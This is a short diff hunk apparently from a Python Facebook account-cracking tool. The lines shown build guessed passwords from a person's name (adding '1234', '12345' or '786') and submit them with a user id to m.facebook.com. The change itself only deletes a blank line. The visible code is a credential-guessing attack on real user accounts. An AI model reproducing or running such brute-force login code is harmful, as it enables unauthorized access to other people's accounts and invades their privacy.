@@ -475,4 +475,3 @@ try:
                         else:
                             pwx = [name,xz[0]+'1234',xz[0]+'1234',xz[0]+'12345',xz[0]+'786']
                         kirim.submit(self.__metode__, uid, pwx, "m.facebook.com")
-                    
